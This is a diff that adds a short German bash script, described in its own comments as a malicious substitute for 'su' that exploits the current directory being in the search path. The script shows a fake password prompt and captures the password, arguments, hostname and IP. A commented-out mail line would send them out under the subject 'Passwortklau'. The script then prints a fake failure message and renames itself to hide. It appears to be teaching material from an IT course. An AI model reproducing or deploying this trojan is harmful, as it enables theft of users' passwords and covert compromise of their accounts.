@@ -1,0 +1,42 @@
+#!/bin/bash
+# Gemeiner Ersatz für su
+# Ausnutzen Sicherheitslücke aktuelles Verzeichnis im Suchpfad
+INFOFILE=.suinfo
+ABSENDER=bill.gates@microsoft.test
+EMPFAENGER=it2008@it2008.ba-leipzig.de
+MVSCRIPT=.mymove
+
+echo -n "Passwort:"
+read -s PASSWORD
+echo ""
+sleep 3
+echo "su: ungültiges Kennwort"
+
+echo "Parameter 1: "$1        >  $INFOFILE
+echo "Parameter 2: "$2        >> $INFOFILE
+echo "Passwort   : "$PASSWORD >> $INFOFILE
+HOSTIP=`host -t A $HOSTNAME`
+echo "Host und IP: "$HOSTIP   >> $INFOFILE
+echo `date`                   >> $INFOFILE
+echo "."                      >> $INFOFILE # Mail beenden
+
+# mail -s Passwortklau -r $ABSENDER $EMPFAENGER < $INFOFILE
+rm $INFOFILE  # temporäre Datei Löschen
+
+echo "#!/bin/bash"		>  $MVSCRIPT
+echo "sleep 10"                 >> $MVSCRIPT
+echo "mv .su su"                >> $MVSCRIPT
+echo "rm $MVSCRIPT"             >> $MVSCRIPT
+chmod 755 $MVSCRIPT
+$MVSCRIPT & > /dev/null
+
+mv su .su	# Script su verstecken
+
+exit 0
+
+
+
+
+
+
+
